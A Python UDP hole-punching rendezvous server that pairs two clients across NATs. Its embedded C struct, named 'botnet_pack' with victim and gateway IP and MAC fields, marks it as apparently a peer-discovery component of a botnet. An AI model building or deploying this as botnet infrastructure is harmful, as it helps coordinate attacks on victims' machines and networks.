import socket
import struct

PORT = 3301

clients = []
SERIALIZATION = "=iB" + "L" * 5 + "HLHLH"
"""
struct network_adapter
{
	ULONG32 hip;
	ULONG32 netmask;
	ULONG32 broadcast;
};

typedef struct {
	uint32_t ip;
	uint16_t port;
} adr;

struct botnet_pack
{
	enum PACK_TYPE type;
	/*-------commnad-------*/
	BYTE act;
	ULONG32 gateway_ip;
	ULONG32 victim_ip;
	BYTE gateway_mac[6];
	BYTE victim_mac[6];
	/*---------------------*/
	
	/*--p2p-communication--*/
	union
	{
		uint16_t id; // commands 
		uint16_t num_of_hosts; // p2p establishing
	} numerics ;
	
	adr dst_peer, private_peer;
	/*---------------------*/
"""


class TYPE:
    PEER_REQUEST = 2
    PEER_REPLY = 3


def ip2int(addr):
    return struct.unpack("!I", socket.inet_aton(addr))[0]


def udp_punch_hole(clients_lst, udp_sock):
    udp_sock.sendto(struct.pack(SERIALIZATION, TYPE.PEER_REPLY, 0, 0, 0, 0, 0, 0, 0, ip2int(clients_lst[1][0]),
                                ip2int(str(clients_lst[1][1])), 0, 0), clients_lst[0])
    udp_sock.sendto(struct.pack(SERIALIZATION, TYPE.PEER_REPLY, 0, 0, 0, 0, 0, 0, 0, ip2int(clients_lst[0][0]),
                                ip2int(str(clients_lst[0][1])), 0, 0), clients_lst[1])


def main():
    # create udp socket
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # bind it to the UDP-PH port
    udp_sock.bind(('', PORT))

    # set timeout for making sure 2 clients connecting within 20 seconds from one another
    udp_sock.settimeout(20)

    while True:

        try:
            # wait for connection
            data, adr = udp_sock.recvfrom(1024)

            # log to the user client has just joined
            print("client connected from", adr)

            # add the client to the clients list
            clients.append(adr)

            # check if two clients are connected
            if len(clients) == 2:

                # check if both connecting from the same network
                if clients[0][0] == clients[1][0]:

                    # clear if they are already on the same net
                    clients.clear()

                # not on the same net
                else:
                    # udp punch hole
                    udp_punch_hole(clients, udp_sock)

        # if no connection has been received for 20 seconds
        except Exception:

            # clear clients list
            clients.clear()


if __name__ == '__main__':
    main()
